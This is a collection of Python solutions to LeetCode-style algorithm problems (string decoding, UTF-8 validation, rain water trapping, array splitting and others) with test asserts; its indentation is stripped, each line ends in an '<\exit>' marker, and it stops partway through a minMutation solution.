assert Solution().isSubsequence("acb", "ahbgdc") == False<\exit>
class Solution(object):<\exit>
def isSubsequence(self, s, t):<\exit>
i = 0<\exit>
j = 0<\exit>
while i < len(s) and j < len(t):<\exit>
if t[j] != s[i]:<\exit>
j += 1<\exit>
else:<\exit>
i += 1<\exit>
j += 1<\exit>
return i == len(s)<\exit>
class Solution(object):<\exit>
def validUtf8(self, data):<\exit>
required = 0<\exit>
for d in data:<\exit>
if d & 0x80 == 0:<\exit>
if required != 0:<\exit>
return False<\exit>
else:<\exit>
one_cnt = 0<\exit>
while d & 0x80 == 0x80:<\exit>
one_cnt += 1<\exit>
d <<= 1<\exit>
if required != 0:<\exit>
if one_cnt != 1:<\exit>
return False<\exit>
required -= 1<\exit>
else:<\exit>
if one_cnt == 1:<\exit>
return False<\exit>
required += (one_cnt - 1)<\exit>
return required == 0<\exit>
if __name__ == "__main__":<\exit>
assert Solution().validUtf8([197, 130, 1]) == True<\exit>
assert Solution().validUtf8([235, 140, 4]) == False<\exit>
class Solution(object):<\exit>
def decodeString(self, s):<\exit>
stk = [<\exit>
[1, []]<\exit>
]<\exit>
i = 0<\exit>
while i < len(s):<\exit>
if s[i].isdigit():<\exit>
j = i+1<\exit>
while s[j] != '[': j += 1<\exit>
stk.append([<\exit>
int(s[i:j]), []<\exit>
])<\exit>
i = j+1<\exit>
elif s[i].islower():<\exit>
stk[-1][1].append(s[i])<\exit>
i += 1<\exit>
elif s[i] == ']':<\exit>
cnt, partial = stk.pop()<\exit>
partial = ''.join(partial) * cnt<\exit>
stk[-1][1].append(partial)<\exit>
i += 1<\exit>
return ''.join(stk.pop()[1])<\exit>
class SolutionVerbose(object):<\exit>
def decodeString(self, s):<\exit>
stk = []<\exit>
i = 0<\exit>
ret = []<\exit>
while i < len(s):<\exit>
if s[i].isdigit():<\exit>
j = i+1<\exit>
while s[j] != '[': j += 1<\exit>
stk.append([<\exit>
int(s[i:j]), []<\exit>
])<\exit>
i = j+1<\exit>
elif s[i].islower():<\exit>
if not stk:<\exit>
ret.append(s[i])<\exit>
else:<\exit>
stk[-1][1].append(s[i])<\exit>
i += 1<\exit>
elif s[i] == ']':<\exit>
cnt, partial = stk.pop()<\exit>
partial = ''.join(partial) * cnt<\exit>
if not stk:<\exit>
ret.append(partial)<\exit>
else:<\exit>
stk[-1][1].append(partial)<\exit>
i += 1<\exit>
return ''.join(ret)<\exit>
class SolutionError(object):<\exit>
def decodeString(self, s):<\exit>
stk = []<\exit>
i = 0<\exit>
ret = []<\exit>
while i < len(s):<\exit>
if s[i].isdigit():<\exit>
j = i + 1<\exit>
while s[j] != '[': j += 1<\exit>
prev = stk[-1] if stk else 1<\exit>
stk.append(prev * int(s[i:j]))<\exit>
i = j + 1<\exit>
elif s[i].islower():<\exit>
repeat = stk[-1] if stk else 1<\exit>
for _ in xrange(repeat): ret.append(s[i])<\exit>
i += 1<\exit>
elif s[i] == ']':<\exit>
stk.pop()<\exit>
i += 1<\exit>
return ''.join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().decodeString('2[abc]3[cd]ef') == 'abcabccdcdcdef'<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def longestSubstring(self, s, k):<\exit>
if not s:<\exit>
return 0<\exit>
cnt = defaultdict(int)<\exit>
for e in s: cnt[e] += 1<\exit>
c = min(<\exit>
s,<\exit>
key=lambda x: cnt[x],<\exit>
)<\exit>
if cnt[c] >= k:<\exit>
return len(s)<\exit>
return max(<\exit>
map(lambda x: self.longestSubstring(x, k), s.split(c))<\exit>
)<\exit>
import sys<\exit>
class Solution(object):<\exit>
def maxRotateFunction(self, A):<\exit>
if not A: return 0<\exit>
gmax = -sys.maxint<\exit>
n = len(A)<\exit>
s = sum(A)<\exit>
cur = sum(idx * val for idx, val in enumerate(A))<\exit>
for r in reversed(A):<\exit>
cur = cur + s - n * r<\exit>
gmax = max(gmax, cur)<\exit>
return gmax<\exit>
if __name__ == "__main__":<\exit>
assert Solution().maxRotateFunction([4, 3, 2, 6]) == 26<\exit>
class Solution(object):<\exit>
def integerReplacement(self, n):<\exit>
ret = 0<\exit>
while n != 1:<\exit>
ret += 1<\exit>
if n & 1 == 0:<\exit>
n >>= 1<\exit>
elif n == 0b11 or n >> 1 & 1 == 0:<\exit>
n -= 1<\exit>
else:<\exit>
n += 1<\exit>
return ret<\exit>
def integerReplacementRecur(self, n):<\exit>
if n == 1: return 0<\exit>
ret = 1<\exit>
if n%2 == 0:<\exit>
ret += self.integerReplacement(n/2)<\exit>
else:<\exit>
ret += min(self.integerReplacement(n+1), self.integerReplacement(n-1))<\exit>
return ret<\exit>
import random<\exit>
class Solution(object):<\exit>
def __init__(self, nums):<\exit>
self.A = nums<\exit>
def pick(self, target):<\exit>
sz = 0<\exit>
ret = None<\exit>
for idx, val in enumerate(self.A):<\exit>
if val == target:<\exit>
sz += 1<\exit>
p = random.randrange(0, sz)<\exit>
if p == 0:<\exit>
ret = idx<\exit>
return ret<\exit>
class SolutionError(object):<\exit>
def __init__(self, nums):<\exit>
self.d = {}<\exit>
for idx, val in enumerate(nums):<\exit>
if val not in self.d:<\exit>
self.d[val] = (idx, 1)<\exit>
else:<\exit>
prev, sz = self.d[val]<\exit>
p = random.randrange(0, sz)<\exit>
if p < sz:<\exit>
self.d[val] = (idx, sz + 1)<\exit>
else:<\exit>
self.d[val] = (prev, sz + 1)<\exit>
def pick(self, target):<\exit>
return self.d[target][0]<\exit>
from collections import defaultdict<\exit>
from itertools import izip<\exit>
class Solution(object):<\exit>
def calcEquation(self, equations, values, queries):<\exit>
G = defaultdict(dict)<\exit>
for edge, val in izip(equations, values):<\exit>
s, e = edge<\exit>
G[s][e], G[e][s] = val, 1/val<\exit>
G[s][s], G[e][e] = 1, 1<\exit>
return [self.dfs(G, s, e, set()) for s, e in queries]<\exit>
def dfs(self, G, s, e, path):<\exit>
if s not in G or e not in G:<\exit>
return -1.0<\exit>
if e in G[s]:<\exit>
return G[s][e]<\exit>
for nbr in G[s]:<\exit>
if nbr not in path:<\exit>
path.add(nbr)<\exit>
val = self.dfs(G, nbr, e, path)<\exit>
if val != -1.0:<\exit>
return val * G[s][nbr]<\exit>
path.remove(nbr)<\exit>
return -1.0<\exit>
class Solution(object):<\exit>
def calcEquation(self, equations, values, queries):<\exit>
G = defaultdict(dict)<\exit>
for edge, val in izip(equations, values):<\exit>
s, e = edge<\exit>
G[s][e], G[e][s] = val, 1/val<\exit>
G[s][s], G[e][e] = 1, 1<\exit>
for mid in G:<\exit>
for s in G[mid]:<\exit>
for e in G[mid]:<\exit>
G[s][e] = G[s][mid] * G[mid][e]<\exit>
return [G[s].get(e, -1.0) for s, e in queries]<\exit>
class Solution(object):<\exit>
def findNthDigit(self, n):<\exit>
digit_cnt = 1<\exit>
num_cnt = 9<\exit>
while n > digit_cnt * num_cnt:<\exit>
n -= digit_cnt * num_cnt<\exit>
digit_cnt += 1<\exit>
num_cnt *= 10<\exit>
n -= 1<\exit>
q, r = n / digit_cnt, n % digit_cnt<\exit>
target = num_cnt / 9 + q<\exit>
return int(str(target)[r])<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.hours = (1, 2, 4, 8)<\exit>
self.minutes = (1, 2, 4, 8, 16, 32)<\exit>
def readBinaryWatch(self, num):<\exit>
def gen():<\exit>
for hour_n in xrange(min(num, 4)+1):<\exit>
for hour in self.hour(hour_n):<\exit>
for minute in self.minute(num-hour_n):<\exit>
hour = str(hour)<\exit>
minute = ('0' + str(minute))[-2:]<\exit>
yield hour + ':' + minute<\exit>
return list(gen())<\exit>
def gen(self, n, head, lst, func):<\exit>
if head == len(lst):<\exit>
yield None<\exit>
if n == 0:<\exit>
yield 0<\exit>
for i in xrange(head, len(lst)):<\exit>
for rest in self.gen(n-1, i+1, lst, func):<\exit>
if rest is not None:<\exit>
ret = lst[i]+rest<\exit>
if func(ret):<\exit>
yield ret<\exit>
else:<\exit>
break<\exit>
def hour(self, n):<\exit>
return self.gen(n, 0, self.hours, lambda x: x < 12)<\exit>
def minute(self, n):<\exit>
return self.gen(n, 0, self.minutes, lambda x: x < 60)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().readBinaryWatch(1) == ['0:01', '0:02', '0:04', '0:08', '0:16', '0:32', '1:00', '2:00', '4:00',<\exit>
'8:00']<\exit>
class Solution(object):<\exit>
def removeKdigits(self, num, k):<\exit>
stk = []<\exit>
for char in num:<\exit>
while k and stk and stk[-1] > char:<\exit>
stk.pop()<\exit>
k -= 1<\exit>
stk.append(char)<\exit>
for _ in xrange(k): stk.pop()<\exit>
return ''.join(stk).lstrip('0') or '0'<\exit>
class Solution(object):<\exit>
def canCross(self, stones):<\exit>
F = {}<\exit>
for stone in stones:<\exit>
F[stone] = set()<\exit>
F[0].add(0)<\exit>
for stone in stones:<\exit>
for step in F[stone]:<\exit>
for i in (-1, 0, 1):<\exit>
nxt = stone + step + i<\exit>
if nxt != stone and nxt in F:<\exit>
F[nxt].add(step + i)<\exit>
return True if F[stones[-1]] else False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canCross([0, 2]) == False<\exit>
assert Solution().canCross([0, 1, 3, 5, 6, 8, 12, 17]) == True<\exit>
assert Solution().canCross([0, 1, 2, 3, 4, 8, 9, 11]) == False<\exit>
class TreeNode(object):<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.s = 0<\exit>
def sumOfLeftLeaves(self, root):<\exit>
self.traverse(root)<\exit>
return self.s<\exit>
def traverse(self, node):<\exit>
if not node:<\exit>
return<\exit>
if node.left and not node.left.left and not node.left.right:<\exit>
self.s += node.left.val<\exit>
self.traverse(node.left)<\exit>
self.traverse(node.right)<\exit>
class Solution(object):<\exit>
def toHex(self, num):<\exit>
ret = []<\exit>
while len(ret) < 8 and num:<\exit>
ret.append(self.encode(num & 0xf))<\exit>
num >>= 4<\exit>
return ''.join(ret[::-1]) or '0'<\exit>
def toHexNormal(self, num):<\exit>
ret = []<\exit>
while len(ret) < 8 and num:<\exit>
ret.append(self.encode(num % 16))<\exit>
num /= 16<\exit>
return ''.join(ret[::-1]) or '0'<\exit>
def encode(self, d):<\exit>
if 0 <= d < 10:<\exit>
return str(d)<\exit>
return chr(ord('a') + d - 10)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().toHex(-1) == 'ffffffff'<\exit>
from collections import defaultdict<\exit>
class Node(object):<\exit>
def __init__(self, lo, hi, cnt):<\exit>
self.lo = lo<\exit>
self.hi = hi<\exit>
self.cnt = cnt<\exit>
self.left = None<\exit>
self.right = None<\exit>
def __repr__(self):<\exit>
return repr("[%d,%d)" % (self.lo, self.hi))<\exit>
class SegmentTree(object):<\exit>
def __init__(self):<\exit>
self.root = None<\exit>
def build(self, lo, hi):<\exit>
if lo >= hi: return<\exit>
if lo == hi-1: return Node(lo, hi, 1)<\exit>
root = Node(lo, hi, hi-lo)<\exit>
root.left = self.build(lo, (hi+lo)/2)<\exit>
root.right = self.build((lo+hi)/2, hi)<\exit>
return root<\exit>
def find_delete(self, root, sz):<\exit>
root.cnt -= 1<\exit>
if not root.left:<\exit>
return root.lo<\exit>
elif root.left.cnt >= sz:<\exit>
return self.find_delete(root.left, sz)<\exit>
else:<\exit>
return self.find_delete(root.right,<\exit>
sz-root.left.cnt)<\exit>
class Solution(object):<\exit>
def reconstructQueue(self, A):<\exit>
def cmp(a, b):<\exit>
if a[0] != b[0]:<\exit>
return a[0]-b[0]<\exit>
else:<\exit>
return a[1]-b[1]<\exit>
st = SegmentTree()<\exit>
n = len(A)<\exit>
st.root = st.build(0, n)<\exit>
A.sort(cmp=cmp)<\exit>
ret = [0]*n<\exit>
ret_cnt = defaultdict(int)<\exit>
for a in A:<\exit>
val, inv = a<\exit>
idx = st.find_delete(st.root, inv+1-ret_cnt[val])<\exit>
ret_cnt[val] += 1<\exit>
ret[idx] = a<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().reconstructQueue(<\exit>
[[9, 0], [7, 0], [1, 9], [3, 0], [2, 7], [5, 3], [6, 0], [3, 4], [6, 2], [5, 2]]) == [[3, 0], [6, 0], [7, 0],<\exit>
[5, 2], [3, 4], [5, 3],<\exit>
[6, 2], [2, 7], [9, 0],<\exit>
[1, 9]]<\exit>
import heapq<\exit>
class Cell:<\exit>
def __init__(self, i, j, h):<\exit>
self.i = i<\exit>
self.j = j<\exit>
self.h = h<\exit>
def __cmp__(self, other):<\exit>
return self.h - other.h<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]<\exit>
def trapRainWater(self, mat):<\exit>
if not mat: return 0<\exit>
m, n = len(mat), len(mat[0])<\exit>
visited = [[False for _ in xrange(n)] for _ in xrange(m)]<\exit>
h = []<\exit>
for i in xrange(m):<\exit>
visited[i][0] = True<\exit>
heapq.heappush(h, Cell(i, 0, mat[i][0]))<\exit>
visited[i][n-1] = True<\exit>
heapq.heappush(h, Cell(i, n-1, mat[i][n-1]))<\exit>
for j in xrange(1, n-1):<\exit>
visited[0][j] = True<\exit>
heapq.heappush(h, Cell(0, j, mat[0][j]))<\exit>
visited[m-1][j] = True<\exit>
heapq.heappush(h, Cell(m-1, j, mat[m-1][j]))<\exit>
trapped = 0<\exit>
while h:<\exit>
cur = heapq.heappop(h)<\exit>
for dir in self.dirs:<\exit>
I, J = cur.i+dir[0], cur.j+dir[1]<\exit>
if 0 <= I < m and 0 <= J < n and not visited[I][J]:<\exit>
nxt = Cell(I, J, mat[I][J])<\exit>
if nxt.h < cur.h:<\exit>
trapped += cur.h - nxt.h<\exit>
nxt.h = cur.h<\exit>
visited[I][J] = True<\exit>
heapq.heappush(h, nxt)<\exit>
return trapped<\exit>
if __name__ == "__main__":<\exit>
assert Solution().trapRainWater([<\exit>
[12, 13, 0, 12],<\exit>
[13, 4, 13, 12],<\exit>
[13, 8, 10, 12],<\exit>
[12, 13, 12, 12],<\exit>
[13, 13, 13, 13]]<\exit>
) == 14<\exit>
assert Solution().trapRainWater([<\exit>
[9, 1, 10, 10],<\exit>
[9, 1, 2, 8],<\exit>
[2, 6, 5, 0],<\exit>
[6, 0, 9, 0]]<\exit>
) == 0<\exit>
class Solution(object):<\exit>
def validWordAbbreviation(self, word, abbr):<\exit>
w = 0<\exit>
a = 0<\exit>
while w < len(word) and a < len(abbr):<\exit>
if abbr[a].isdigit() and abbr[a] != '0':<\exit>
e = a<\exit>
while e < len(abbr) and abbr[e].isdigit(): e += 1<\exit>
num = int(abbr[a:e])<\exit>
a = e<\exit>
w += num<\exit>
else:<\exit>
if word[w] != abbr[a]:<\exit>
return False<\exit>
w += 1<\exit>
a += 1<\exit>
return w == len(word) and a == len(abbr)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().validWordAbbreviation("internationalization", "i12iz4n") == True<\exit>
assert Solution().validWordAbbreviation("apple", "a2e") == False<\exit>
from collections import defaultdict<\exit>
class Solution(object):<\exit>
def longestPalindrome(self, s):<\exit>
c = defaultdict(int)<\exit>
for elt in s:<\exit>
c[elt] += 1<\exit>
ret = 0<\exit>
for v in c.values():<\exit>
ret += (v/2) * 2<\exit>
if any(map(lambda x: x % 2 == 1, c.values())):<\exit>
ret += 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().longestPalindrome("abccccdd") == 7<\exit>
from typing import List<\exit>
from functools import lru_cache<\exit>
class SolutionDP:<\exit>
def splitArray(self, nums: List[int], m: int) -> int:<\exit>
n = len(nums)<\exit>
sums = [0]<\exit>
for e in nums:<\exit>
sums.append(sums[-1] + e)<\exit>
F = [[float("inf") for _ in range(m + 1)] for _ in range(n + 1)]<\exit>
for l in range(1, n + 1):<\exit>
F[l][1] = sums[l] - sums[0]<\exit>
for l in range(1, n + 1):<\exit>
for k in range(1, m + 1):<\exit>
for j in range(l):<\exit>
F[l][k] = min(<\exit>
F[l][k], max(F[j][k-1], sums[l] - sums[j])<\exit>
)<\exit>
return F[n][m]<\exit>
class Solution:<\exit>
def splitArray(self, nums: List[int], m: int) -> int:<\exit>
lo = max(nums)<\exit>
hi = sum(nums) + 1<\exit>
ret = hi<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
cnt = 1<\exit>
cur_sum = 0<\exit>
for e in nums:<\exit>
if cur_sum + e > mid:<\exit>
cnt += 1<\exit>
cur_sum = e<\exit>
else:<\exit>
cur_sum += e<\exit>
if cnt <= m:<\exit>
ret = min(ret, mid)<\exit>
hi = mid<\exit>
else:<\exit>
lo = mid + 1<\exit>
return ret<\exit>
class SolutionTLE2:<\exit>
def __init__(self):<\exit>
self.sums = [0]<\exit>
def splitArray(self, nums: List[int], m: int) -> int:<\exit>
for n in nums:<\exit>
self.sums.append(self.sums[-1] + n)<\exit>
ret = self.dfs(len(nums), m)<\exit>
return ret<\exit>
@lru_cache(maxsize=None)<\exit>
def dfs(self, hi, m):<\exit>
if m == 1:<\exit>
return self.sums[hi] - self.sums[0]<\exit>
mini = float("inf")<\exit>
for j in range(hi):<\exit>
right = self.sums[hi] - self.sums[j]<\exit>
left = self.dfs(j, m - 1)<\exit>
mini = min(mini, max(left, right))<\exit>
return mini<\exit>
class SolutionTLE:<\exit>
def __init__(self):<\exit>
self.sums = [0]<\exit>
def splitArray(self, nums: List[int], m: int) -> int:<\exit>
for n in nums:<\exit>
self.sums.append(self.sums[-1] + n)<\exit>
ret = self.dfs(tuple(nums), 0, len(nums), m)<\exit>
return ret<\exit>
@lru_cache(maxsize=None)<\exit>
def dfs(self, nums, lo, hi, m):<\exit>
if m == 1:<\exit>
return self.sums[hi] - self.sums[lo]<\exit>
mini = float("inf")<\exit>
for j in range(lo, hi):<\exit>
left = self.sums[j] - self.sums[lo]<\exit>
right = self.dfs(nums, j, hi, m - 1)<\exit>
mini = min(mini, max(left, right))<\exit>
return mini<\exit>
if __name__ == "__main__":<\exit>
assert Solution().splitArray([1, 4, 4], 3) == 4<\exit>
assert Solution().splitArray([7,2,5,10,8], 2) == 18<\exit>
class Solution(object):<\exit>
def minAbbreviation(self, target, dictionary):<\exit>
ret = (target, len(target))<\exit>
for abbr, abbr_l in self.dfs(target):<\exit>
if self.validate(dictionary, abbr) and ret[1] > abbr_l:<\exit>
ret = (abbr, abbr_l)<\exit>
return ret[0]<\exit>
def dfs(self, word):<\exit>
if not word:<\exit>
return [("", 0)]<\exit>
ret = []<\exit>
for l in xrange(len(word)+1):<\exit>
left_num = str(l) if l else ""<\exit>
left_l = 1 if left_num != "" else 0<\exit>
left_l += 1 if l < len(word) else 0<\exit>
for right, right_l in self.dfs(word[l+1:]):<\exit>
cur = left_num + word[l:l+1] + right<\exit>
ret.append((cur, left_l + right_l))<\exit>
return ret<\exit>
def validate(self, dictionary, abbr):<\exit>
for w in dictionary:<\exit>
if self.validWordAbbreviation(w, abbr):<\exit>
return False<\exit>
return True<\exit>
def validWordAbbreviation(self, word, abbr):<\exit>
w = 0<\exit>
a = 0<\exit>
while w < len(word) and a < len(abbr):<\exit>
if abbr[a].isdigit() and abbr[a] != '0':<\exit>
e = a<\exit>
while e < len(abbr) and abbr[e].isdigit(): e += 1<\exit>
num = int(abbr[a:e])<\exit>
a = e<\exit>
w += num<\exit>
else:<\exit>
if word[w] != abbr[a]:<\exit>
return False<\exit>
w += 1<\exit>
a += 1<\exit>
return w == len(word) and a == len(abbr)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minAbbreviation("apple", ["blade"]) == "a4"<\exit>
class Solution(object):<\exit>
def fizzBuzz(self, n):<\exit>
ret = []<\exit>
for i in xrange(1, n+1):<\exit>
cur = ""<\exit>
if i % 3 == 0:<\exit>
cur += "Fizz"<\exit>
if i % 5 == 0:<\exit>
cur += "Buzz"<\exit>
if not cur:<\exit>
cur = str(i)<\exit>
ret.append(cur)<\exit>
return ret<\exit>
class Solution:<\exit>
def count(self, l):<\exit>
return (l-1) * l // 2<\exit>
def numberOfArithmeticSlices(self, A):<\exit>
ret = 0<\exit>
if len(A) < 3:<\exit>
return ret<\exit>
delta = []<\exit>
for i in range(1, len(A)):<\exit>
delta.append(A[i] - A[i-1])<\exit>
s = 0<\exit>
e = 0<\exit>
while s < len(delta):<\exit>
while e < len(delta) and delta[s] == delta[e]:<\exit>
e += 1<\exit>
l = e - s<\exit>
ret += self.count(l)<\exit>
s = e<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().numberOfArithmeticSlices([1, 2, 3, 4]) == 3<\exit>
import heapq<\exit>
class Solution:<\exit>
def thirdMax(self, nums):<\exit>
if not nums:<\exit>
return None<\exit>
h = []<\exit>
for e in set(nums):<\exit>
if len(h) < 3:<\exit>
heapq.heappush(h, e)<\exit>
elif len(h) == 3 and e > h[0]:<\exit>
heapq.heappushpop(h, e)<\exit>
assert len(h) <= 3<\exit>
if len(h) == 3:<\exit>
ret = min(h)<\exit>
else:<\exit>
ret = max(h)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().thirdMax([1, 2, 3, 4]) == 2<\exit>
assert Solution().thirdMax([4, 3, 2, 1]) == 2<\exit>
assert Solution().thirdMax([2, 2, 3, 1]) == 1<\exit>
assert Solution().thirdMax([4, 3]) == 4<\exit>
class Solution:<\exit>
def int(self, n):<\exit>
return ord(n) - ord("0")<\exit>
def addStrings(self, num1, num2):<\exit>
ret = []<\exit>
if len(num1) > len(num2):<\exit>
num1, num2 = num2, num1<\exit>
num1 = num1[::-1]<\exit>
num2 = num2[::-1]<\exit>
carry = 0<\exit>
idx = 0<\exit>
while idx < len(num2):<\exit>
if idx < len(num1):<\exit>
s = self.int(num1[idx]) + self.int(num2[idx]) + carry<\exit>
else:<\exit>
s = self.int(num2[idx]) + carry<\exit>
if s >= 10:<\exit>
s -= 10<\exit>
carry = 1<\exit>
else:<\exit>
carry = 0<\exit>
ret.append(s)<\exit>
idx += 1<\exit>
if carry:<\exit>
ret.append(carry)<\exit>
return "".join(map(str, ret[::-1]))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().addStrings("9999", "1") == "10000"<\exit>
assert Solution().addStrings("9999", "9999") == "19998"<\exit>
assert Solution().addStrings("23", "8") == "31"<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def canPartition(self, nums):<\exit>
if not nums:<\exit>
return False<\exit>
s = sum(nums)<\exit>
if s % 2 != 0:<\exit>
return False<\exit>
target = s // 2<\exit>
d = defaultdict(lambda: defaultdict(int))<\exit>
d[0][0] = 1<\exit>
d[0][nums[0]] = 1<\exit>
for i in range(1, len(nums)):<\exit>
for v in range(target + 1):<\exit>
d[i][v] = d[i-1][v] + d[i-1][v-nums[i]]<\exit>
return any(d[i][target] > 0 for i in range(len(nums)))<\exit>
def canPartition_TLE(self, nums):<\exit>
nums.sort()<\exit>
s = sum(nums)<\exit>
if s % 2 != 0:<\exit>
return False<\exit>
target = s // 2<\exit>
return self.dfs(nums, 0, target)<\exit>
def dfs(self, nums, idx, target):<\exit>
if not idx < len(nums):<\exit>
return False<\exit>
if nums[idx] == target:<\exit>
return True<\exit>
if nums[idx] > target:<\exit>
return False<\exit>
return (<\exit>
self.dfs(nums, idx + 1, target) or<\exit>
self.dfs(nums, idx + 1, target - nums[idx])<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().canPartition([1, 5, 11, 5]) == True<\exit>
assert Solution().canPartition([1, 2, 3, 5]) == False<\exit>
dirs = ((0, 1), (0, -1), (1, 0), (-1, 0))<\exit>
class Solution:<\exit>
def pacificAtlantic(self, matrix):<\exit>
if not matrix or not matrix[0]:<\exit>
return []<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
P = [[False for _ in range(n)] for _ in range(m)]<\exit>
A = [[False for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
self.dfs(matrix, i, 0, P)<\exit>
self.dfs(matrix, i, n-1, A)<\exit>
for j in range(n):<\exit>
self.dfs(matrix, 0, j, P)<\exit>
self.dfs(matrix, m-1, j, A)<\exit>
ret = [<\exit>
[i, j]<\exit>
for i in range(m)<\exit>
for j in range(n)<\exit>
if P[i][j] and A[i][j]<\exit>
]<\exit>
return ret<\exit>
def dfs(self, matrix, i, j, C):<\exit>
C[i][j] = True<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
for x, y in dirs:<\exit>
I = i + x<\exit>
J = j + y<\exit>
if 0 <= I < m and 0 <= J < n and matrix[i][j] <= matrix[I][J]:<\exit>
if not C[I][J]:<\exit>
self.dfs(matrix, I, J, C)<\exit>
def pacificAtlantic_error(self, matrix):<\exit>
if not matrix or not matrix[0]:<\exit>
return []<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
P = [[False] * n ] * m<\exit>
A = [[False] * n ] * m<\exit>
visisted = [[False] * n ] * m<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
self.dfs_error(matrix, i, j, visisted, P, lambda i, j: i < 0 or j <0)<\exit>
visisted = [[False] * n ] * m<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
self.dfs_error(matrix, i, j, visisted, A, lambda i, j: i >= m or j >= n)<\exit>
ret = [<\exit>
[i, j]<\exit>
for i in range(m)<\exit>
for j in range(n)<\exit>
if P[i][j] and A[i][j]<\exit>
]<\exit>
return ret<\exit>
def dfs_error(self, matrix, i, j, visisted, C, predicate):<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
if visisted[i][j]:<\exit>
return C[i][j]<\exit>
visisted[i][j] = True<\exit>
for x, y in dirs:<\exit>
i2 = i + x<\exit>
j2= j + y<\exit>
if 0 <= i2 < m and 0 <= j2 < n:<\exit>
if self.dfs_error(matrix, i2, j2, visisted, C, predicate) and matrix[i][j] >= matrix[i2][j2]:<\exit>
C[i][j] = True<\exit>
elif predicate(i2, j2):<\exit>
C[i][j] = True<\exit>
return C[i][j]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().pacificAtlantic([<\exit>
[1,2,2,3,5],<\exit>
[3,2,3,4,4],<\exit>
[2,4,5,3,1],<\exit>
[6,7,1,4,5],<\exit>
[5,1,1,2,4]<\exit>
]) == [[0, 4], [1, 3], [1, 4], [2, 2], [3, 0], [3, 1], [4, 0]]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def wordsTyping(self, sentence: List[str], rows: int, cols: int) -> int:<\exit>
sentence = " ".join(sentence) + " "<\exit>
i = 0<\exit>
for r in range(rows):<\exit>
i += cols<\exit>
while sentence[i % len(sentence)] != " ":<\exit>
i -= 1<\exit>
i += 1<\exit>
ret = i // len(sentence)<\exit>
return ret<\exit>
class Solution:<\exit>
def findMaximumXOR(self, nums):<\exit>
ret = 0<\exit>
for i in reversed(range(32)):<\exit>
prefixes = set(num >> i for num in nums)<\exit>
ret <<= 1<\exit>
cur = ret + 1<\exit>
for p in prefixes:<\exit>
if cur ^ p in prefixes:<\exit>
ret = cur<\exit>
break<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findMaximumXOR([3, 10, 5, 25, 2, 8]) == 28<\exit>
import string<\exit>
import operator<\exit>
class Solution:<\exit>
def characterReplacement(self, s, k):<\exit>
counter = {<\exit>
alphabet: 0<\exit>
for alphabet in string.ascii_uppercase<\exit>
}<\exit>
lo = 0<\exit>
ret = 0<\exit>
assert k > 0<\exit>
for hi in range(len(s)):<\exit>
counter[s[hi]] += 1<\exit>
while True:<\exit>
most = max(counter.values())<\exit>
l = hi - lo + 1<\exit>
if l - most > k:<\exit>
counter[s[lo]] -= 1<\exit>
lo += 1<\exit>
else:<\exit>
ret = max(ret, l)<\exit>
break<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().characterReplacement("AABABBA", 1) == 4<\exit>
assert Solution().characterReplacement("ABAB", 2) == 4<\exit>
class Node:<\exit>
def __init__(self, val, isLeaf, topLeft, topRight, bottomLeft, bottomRight):<\exit>
self.val = val<\exit>
self.isLeaf = isLeaf<\exit>
self.topLeft = topLeft<\exit>
self.topRight = topRight<\exit>
self.bottomLeft = bottomLeft<\exit>
self.bottomRight = bottomRight<\exit>
class Solution:<\exit>
def construct(self, grid):<\exit>
l = len(grid)<\exit>
return self._construct(grid, 0, 0, l)<\exit>
def _construct(self, grid, row, col, l):<\exit>
if l == 1:<\exit>
return Node(grid[row][col], True, None, None, None, None)<\exit>
l_child = l // 2<\exit>
topLeft = self._construct(grid, row, col, l_child)<\exit>
topRight = self._construct(grid, row, col + l_child, l_child)<\exit>
bottomLeft = self._construct(grid, row + l_child, col, l_child)<\exit>
bottomRight = self._construct(grid, row + l_child, col + l_child, l_child)<\exit>
is_leaf = (<\exit>
topLeft.val == topRight.val == bottomLeft.val == bottomRight.val<\exit>
!= "*"<\exit>
)<\exit>
if is_leaf:<\exit>
return Node(grid[row][col], True, None, None, None, None)<\exit>
return Node("*", False, topLeft, topRight, bottomLeft, bottomRight)<\exit>
class Node:<\exit>
def __init__(self, val, children):<\exit>
self.val = val<\exit>
self.children = children<\exit>
class Solution:<\exit>
def levelOrder(self, root):<\exit>
if not root:<\exit>
return []<\exit>
q = [root]<\exit>
ret = []<\exit>
while q:<\exit>
cur = []<\exit>
q_new = []<\exit>
for e in q:<\exit>
q_new.extend(e.children)<\exit>
cur.append(e.val)<\exit>
ret.append(cur)<\exit>
q = q_new<\exit>
return ret<\exit>
class Solution:<\exit>
def is_neighbor(self, p, q):<\exit>
diff = 0<\exit>
for a, b in zip(p, q):<\exit>
if a != b:<\exit>
diff += 1<\exit>
if diff > 1:<\exit>
return False<\exit>
return True<\exit>
def minMutation(self, start, end, bank):<\exit>
q = [start]<\exit>
visited = {start}<\exit>
